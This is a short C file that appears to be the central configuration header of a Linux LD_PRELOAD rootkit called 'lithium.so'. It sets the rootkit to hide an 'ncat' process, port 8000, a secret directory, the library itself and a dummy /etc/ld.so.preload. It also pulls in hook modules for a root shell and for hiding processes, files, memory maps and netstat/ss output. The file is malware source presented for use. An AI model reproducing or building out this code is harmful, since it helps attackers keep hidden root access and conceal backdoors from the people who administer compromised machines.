#define _GNU_SOURCE
#include <stdio.h>

/* ========================================================================== */
/*                      CENTRAL CONFIGURATION TUNING                          */
/* ========================================================================== */
#define NAME_TO_HIDE      "ncat"
#define PORT_TO_HIDE       8000
#define PORT_TO_HIDE_HEX  "1F40"
#define HIDE_LIST         "secret_dir,lithium.so,ld.so.preload.dummy"
#define PRELOAD_PATH      "/etc/ld.so.preload"
#define DUMMY_PRELOAD     "/etc/ld.so.preload.dummy"
#define LIB_TO_HIDE       "lithium.so"

// Global thread-local re-entrancy guard variable
__thread int inside_hook = 0;

/* ========================================================================== */
/*                          MODULAR HOOK INCLUSIONS                           */
/* ========================================================================== */
#include "src/rootshell.h"
#include "src/process.h"
#include "src/files.h"
#include "src/netstat.h"
#include "src/ss.h"
#include "src/memhide.h"    
